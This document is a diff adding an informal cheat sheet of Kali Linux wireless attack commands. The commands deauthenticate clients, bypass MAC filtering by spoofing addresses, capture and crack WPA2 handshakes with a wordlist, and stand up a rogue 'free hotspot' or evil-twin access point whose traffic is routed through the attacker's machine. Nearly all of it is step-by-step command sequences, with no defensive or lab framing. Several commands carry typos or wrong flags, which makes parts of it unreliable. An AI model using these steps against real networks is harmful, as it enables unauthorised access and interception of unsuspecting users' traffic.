@@ -1,0 +1,92 @@
+iwlist wlan0 scan | grep ESSID
+nmcli d wifi connect LinuxHintkali password linuxhintpass
+nmtui
+
+Troubleshooting Commands
+useful in case your Wi-Fi device’s drivers weren’t properly detected
+>sudo apt install kali-linux-wireless
+>ifconfig wlp3s0 up
+
+show wireless cart
+>airmon-ng
+run wifi interface on monitoring mode - wifi dongle must support listening mode
+>airmon-ng start wlan0
+run airodump on logical mon0 for show wifi ssid in my zone
+>airodump mon0
+show wifi in chanell 1
+>airodump-ng -c 1 mon0
+deauthenticate attack - 2 times send seauth packet to AccessPoint
+>aireplay-ng -O 2 -a AP-mac-address mon0
+
+mac Filter Hacking
+>airmon-ng start wlan0
+>airodump-ng mon0
+try to connect wifi with ssid
+>iwconfig wlan0 essid SSID channel 4
+check connection is work
+>iwconfig wlan0
+show what mac speak with this AccessPoint
+>airodump-ng -c 4 -a --bssid AP-mac-address mon0
+>macchanger -m macAddress wlan0
+>ifconfig wlan0 down
+>iwconfig wlan0 up
+>iwconfig wlan0 essid SSID channel 4
+>iwconfig wlan0
+
+wpa2 Cracking
+>airmon-ng start wlan0
+>airodump-ng mon0
+>airodump-ng -w ourFile -c 1 --bssid APmacAddress mon0
+Dout Attack
+>aireplay-ng -O 0 -a AP-mac-address mon0
+>aircrack-ng ourFile.cap -w /pentest/passwords/wordlists/darckcoe.lst
+
+hacks Rouge - make api - enable dhcp server - routing to internet
+>ifconfig
+>apt-get update
+>apt-get upgrade
+>apt-get install dhcp3-server -y
+>mv /etc/dhcp3/dhcp.conf /etc/dhcp3/dhcp.conf.backup
+dhcp config
+###
+ddns-update-style ad-hoc;
+default-leas-time 600;
+subnet 192.168.2.0 netmask 255.255.255.0 {
+option subnet-mask 255.255.255.0;
+option broadcast-address 192.168.2.255;
+option routers 192.168.2.1;
+option domain-name-servers 8.8.8.8;
+range 192.168.2.51 192.168.2.100;
+}
+###
+>airmon-ng start wlan0
+>airodump-ng mon0
+create AP - with this command at0 interface add to kali
+>airbase-ng --essid "free hotspot" -c 6 mon0
+>ifconfig at0 up
+add ip to logical AP interface
+>ifconfig at0 192.168.2.1/24
+write route for forward traffic to at0
+>route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
+run dhcp3
+>dhcp3 -cf /etc/dhcp3/dhcp.conf -pf /var/run/dhcp3-server/dhcp.pid at0
+>/etc/init.d/dhcp3-server start
+add route for forward traffic from at0 to internet on another interface eth0
+>iptables --flush
+>iptables --table nat --flush
+>iptables --delete-chain
+>iptables --table nat --delete-chain
+>iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+>iptables --append FORWARD --in-interface at0 -j ACCEPT
+>echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+
+mis association evil twin
+work for AP with no Authentication
+>airmon-ng start wlan0
+see trying peaples for connecting to free wifi and use SSID for create AP with that name
+>airodump mon0
+airbase-ng --ssid "SSIDName" -c channelNumber mon0
+create dhcp
+write routing for send traffic to interface with internet access
